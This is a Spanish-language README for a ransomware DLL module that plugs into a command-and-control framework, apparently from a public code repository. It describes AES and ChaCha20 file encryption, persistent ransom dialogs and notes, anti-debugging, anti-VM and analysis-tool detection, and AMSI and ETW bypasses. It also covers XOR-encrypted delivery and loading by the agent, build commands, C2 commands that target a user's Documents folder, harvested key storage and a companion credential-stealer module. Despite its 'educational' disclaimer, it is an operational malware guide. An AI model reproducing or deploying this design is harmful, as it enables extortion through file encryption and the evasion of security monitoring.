# Ransomware DLL Module

Módulo de encriptación de archivos para C2R2-v2, implementado como biblioteca dinámica (DLL) que puede ser cargada bajo demanda por el agente.

## ⚠️ ADVERTENCIA LEGAL

**ESTE MÓDULO ES SOLO PARA FINES EDUCATIVOS Y DE INVESTIGACIÓN EN SEGURIDAD**

El uso no autorizado de este software para encriptar sistemas que no te pertenecen es **ILEGAL**. Solo debe ser usado en entornos controlados con autorización explícita por escrito.

## Descripción

El ransomware-dll es un módulo de encriptación avanzado que implementa las siguientes funcionalidades:

- **Encriptación AES-256-CBC y ChaCha20-Poly1305**: Múltiples algoritmos de encriptación fuerte
- **Diálogos GUI de rescate**: Ventanas persistentes de Windows con mensajes de ransomware
- **Anti-debugging y Anti-VM**: Detecta debuggers, herramientas de análisis y máquinas virtuales
- **Descubrimiento recursivo de archivos**: Busca archivos en directorios con profundidad configurable
- **Filtrado inteligente**: Evita archivos del sistema, ejecutables y archivos ya encriptados
- **Generación de claves seguras**: Claves aleatorias de 256 bits
- **Notas de rescate**: Crea archivos RANSOM_NOTE.txt en directorios afectados
- **Desencriptación**: Permite recuperar archivos con la clave correcta

## Arquitectura

### Módulos

- **crypto.rs**: Implementación de AES-256-CBC y ChaCha20-Poly1305
- **fileops.rs**: Operaciones de archivos (descubrimiento, lectura, escritura)
- **ransom_dialog.rs**: Diálogos GUI de Windows para mostrar mensajes de ransomware
- **evasion.rs**: Técnicas de evasión (anti-debugging, anti-VM, detección de herramientas)
- **lib.rs**: Interfaz C para exportar funciones

### Funciones Exportadas

```c
// Encripta archivos en un directorio
char* encrypt_directory(const char* path, uint32_t max_depth);

// Desencripta archivos con una clave
char* decrypt_directory(const char* path, const char* key_hex, uint32_t max_depth);

// Libera strings retornados
void free_string(char* s);

// Obtiene la versión del módulo
char* get_version();
```

## Compilación

### Desde Linux/WSL (Cross-compilation)

```bash
# 1. Instalar herramientas necesarias
sudo apt install mingw-w64
rustup target add x86_64-pc-windows-gnu

# 2. Compilar el módulo
./build-ransomware.sh

# O manualmente:
cargo build --release --target x86_64-pc-windows-gnu --package ransomware-dll
```

### Salida

```
target/x86_64-pc-windows-gnu/release/ransomware.dll (~423KB)
```

## Nuevas Características (v2.0)

### 1. Diálogos GUI de Ransomware

El módulo ahora muestra ventanas nativas de Windows durante el proceso de encriptación:

- **Progreso de encriptación**: Notifica al usuario que la encriptación está en progreso
- **Mensaje de rescate**: Muestra información sobre los archivos encriptados con el Key ID
- **Ventanas persistentes**: Usa `MB_SYSTEMMODAL | MB_TOPMOST` para mantener las ventanas en primer plano

### 2. Evasión Avanzada

Implementa múltiples técnicas de evasión antes de ejecutar:

**Anti-Debugging:**
- Detecta `IsDebuggerPresent()` 
- El ransomware no se ejecuta si detecta un debugger

**Anti-Analysis Tools:**
- Detecta herramientas comunes: OllyDbg, x64dbg, IDA Pro, Process Hacker, Procmon, Wireshark, Fiddler, CheatEngine, Frida
- Escanea procesos en ejecución usando `CreateToolhelp32Snapshot`

**Anti-VM:**
- Detecta máquinas virtuales por archivos de drivers (VMware, VirtualBox)
- Verifica número bajo de CPUs (indicador de VM)

### 3. Mejor Encriptación

- **AES-256-CBC**: Método original, compatible con versiones anteriores
- **ChaCha20-Poly1305**: Nuevo algoritmo AEAD más moderno y rápido
- Ambos usan claves de 256 bits generadas aleatoriamente

## Uso desde C2

### 1. Encriptar módulo

```bash
cd builder
cargo run -- encrypt-module --module ransomware
```

Esto genera:
- `c2r2-server/modules/ransomware.enc` - DLL encriptada con XOR
- `c2r2-server/modules/ransomware.key` - Clave XOR (32 bytes)

### 2. Comandos del servidor

```
# Encriptar directorio
/encrypt C:\Users\Target\Documents 5

# Desencriptar con clave
/decrypt C:\Users\Target\Documents abc123def456... 5
```

### 3. Flujo de ejecución

1. El servidor sube `ransomware.enc` y `ransomware.key` al agente
2. El agente desencripta la DLL con XOR
3. El agente escribe la DLL en temp con nombre aleatorio
4. El agente carga la DLL con `LoadLibraryA`
5. El agente obtiene la función exportada con `GetProcAddress`
6. El agente ejecuta la función
7. El agente libera la DLL y elimina el archivo temporal
8. El resultado se envía de vuelta al servidor

## Características de Seguridad

### Evasión implementada

- **AMSI Bypass**: Desactiva AMSI antes de cargar el módulo
- **ETW Bypass**: Desactiva ETW para evitar logging
- **Nombre aleatorio**: El archivo temporal usa nombre aleatorio basado en PID
- **Eliminación automática**: El archivo se borra inmediatamente después de usar

### ¿Ejecución en memoria?

**No completamente**. La implementación actual:
1. ✅ La DLL se transmite encriptada
2. ✅ La DLL se desencripta en memoria
3. ⚠️ Se escribe temporalmente a disco para `LoadLibraryA`
4. ✅ Se elimina inmediatamente después

Para **verdadera ejecución en memoria** (Reflective DLL Injection) se necesitaría:
- Parser PE manual
- Mapeo de secciones en memoria
- Resolución manual de imports
- Aplicación de relocations
- Invocación de DllMain manualmente

Esto es significativamente más complejo (~500+ líneas adicionales).

## Formato de Respuestas

### Encriptación exitosa

```
KEY:abc123def456...:ENCRYPTED:42
```

- `KEY:` - Prefijo
- `abc123...` - Clave hexadecimal de 64 caracteres (32 bytes)
- `ENCRYPTED:` - Separador
- `42` - Número de archivos encriptados

### Desencriptación exitosa

```
OK:Decrypted 42 files
```

### Errores

```
ERROR:Directory does not exist
ERROR:No files to encrypt
ERROR:Invalid key format
```

## Archivos Evitados

El módulo **NO** encripta:

- Archivos ya encriptados (`.encrypted`)
- Archivos del sistema (`.exe`, `.dll`, `.sys`, `.drv`, `.com`)
- Scripts (`.bat`, `.cmd`)
- Notas de rescate (`RANSOM_NOTE.txt`)

## Almacenamiento de Claves

Las claves de encriptación se guardan automáticamente en:

```
harvested/ransomware_key_<client_id>_<timestamp>.txt
```

Contenido:
```
Client: 1
Timestamp: 20241116_235959
Key: abc123def456...
```

## Testing

### Test local (Windows)

```powershell
# Crear directorio de prueba
mkdir C:\test_ransomware
echo "test file" > C:\test_ransomware\file1.txt

# Usar desde C2
/select 1
/encrypt C:\test_ransomware 1

# Verificar encriptación
dir C:\test_ransomware
# Debe mostrar: file1.txt.encrypted, RANSOM_NOTE.txt

# Desencriptar
/decrypt C:\test_ransomware <key_from_output> 1

# Verificar desencriptación
type C:\test_ransomware\file1.txt
```

## Limitaciones

1. **Solo Windows**: El módulo solo funciona en sistemas Windows
2. **Archivos grandes**: Archivos muy grandes pueden tomar tiempo
3. **Permisos**: Requiere permisos de lectura/escritura en los directorios
4. **No es 100% en memoria**: Toca el filesystem temporalmente

## Comparación con stealer-dll

| Característica | stealer-dll | ransomware-dll |
|---------------|-------------|----------------|
| Tamaño | ~1.2MB | ~399KB |
| Funcionalidad | Robo de credenciales | Encriptación de archivos |
| Carga | LoadLibrary | LoadLibrary |
| Respuesta | Base64 | Texto plano |
| Persistencia | No modifica archivos | Modifica archivos |

## Referencias

- Proyecto original: https://github.com/G4sp4rCS/Ransomware-Rust
- Documentación AES: https://docs.rs/aes/latest/aes/
- DLL Loading: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/

## Contribuciones

Este módulo es parte del proyecto C2R2-v2. Para contribuir:

1. Fork el repositorio
2. Crea una rama para tu feature
3. Haz tus cambios
4. Envía un pull request

## Licencia

MIT License - Ver LICENSE en el directorio raíz.
